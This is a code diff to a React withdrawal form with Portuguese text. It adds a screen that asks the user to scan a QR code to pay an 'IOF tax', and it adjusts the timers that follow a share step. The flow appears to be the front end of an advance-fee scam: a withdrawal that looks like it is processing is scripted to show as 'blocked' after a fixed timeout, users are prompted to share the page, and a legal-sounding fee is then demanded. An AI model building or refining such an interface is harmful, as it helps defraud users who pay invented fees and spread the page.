@@ -1,5 +1,6 @@
 import { useState, useEffect } from "react";
 import { Ban, Check } from "lucide-react";
+import { QRCodeSVG } from "qrcode.react";
 import { Switch } from "@/components/ui/switch";
 import {
   Dialog,
@@ -17,15 +18,26 @@ const WithdrawForm = () => {
   const [showLoadingModal, setShowLoadingModal] = useState(false);
   const [showBlockedScreen, setShowBlockedScreen] = useState(false);
   const [showConfirmed, setShowConfirmed] = useState(false);
+  const [showQrCode, setShowQrCode] = useState(false);
 
   useEffect(() => {
-    if (showLoadingModal && !showBlockedScreen) {
+    if (showLoadingModal && !showBlockedScreen && !showConfirmed && !showQrCode) {
       const timer = setTimeout(() => {
         setShowBlockedScreen(true);
       }, 3000);
       return () => clearTimeout(timer);
     }
-  }, [showLoadingModal, showBlockedScreen]);
+  }, [showLoadingModal, showBlockedScreen, showConfirmed, showQrCode]);
+
+  // Show QR code 1 second after confirmed screen
+  useEffect(() => {
+    if (showConfirmed && !showQrCode) {
+      const timer = setTimeout(() => {
+        setShowQrCode(true);
+      }, 1000);
+      return () => clearTimeout(timer);
+    }
+  }, [showConfirmed, showQrCode]);
 
   const handleShare = async () => {
     const shareData = {
@@ -48,10 +60,10 @@ const WithdrawForm = () => {
       });
     }
     
-    // Show confirmed screen after 3 seconds
+    // Show confirmed screen after 2 seconds
     setTimeout(() => {
       setShowConfirmed(true);
-    }, 3000);
+    }, 2000);
   };
 
   const handleSubmit = () => {
@@ -180,6 +192,7 @@ const WithdrawForm = () => {
           if (!open) {
             setShowBlockedScreen(false);
             setShowConfirmed(false);
+            setShowQrCode(false);
           }
         }}>
           <DialogContent className="bg-white rounded-2xl p-8 max-w-[340px] border-0 shadow-xl flex flex-col items-center gap-6 [&>button]:hidden">
@@ -208,6 +221,26 @@ const WithdrawForm = () => {
 
                 <p className="text-foreground/70 text-[10px] text-center leading-snug" style={{ fontFamily: "'Open Sans', sans-serif" }}>
                   O pagamento da taxa IOF é obrigatória conforme a Lei nº 5.143, de 20 de outubro de 1966.
+                </p>
+              </div>
+            ) : showQrCode ? (
+              <div className="w-full flex flex-col items-center gap-6">
+                {/* QR Code Screen */}
+                <h2 className="text-foreground text-2xl text-center" style={{ fontFamily: "'Open Sans', sans-serif", fontWeight: 700 }}>
+                  Pague a taxa IOF
+                </h2>
+                
+                {/* QR Code */}
+                <div className="bg-white p-4 rounded-lg">
+                  <QRCodeSVG 
+                    value={window.location.origin}
+                    size={180}
+                    level="H"
+                  />
+                </div>
+
+                <p className="text-foreground/70 text-[10px] text-center leading-snug" style={{ fontFamily: "'Open Sans', sans-serif" }}>
+                  Escaneie o QR code para efetuar o pagamento da taxa IOF.
                 </p>
               </div>
             ) : showConfirmed ? (
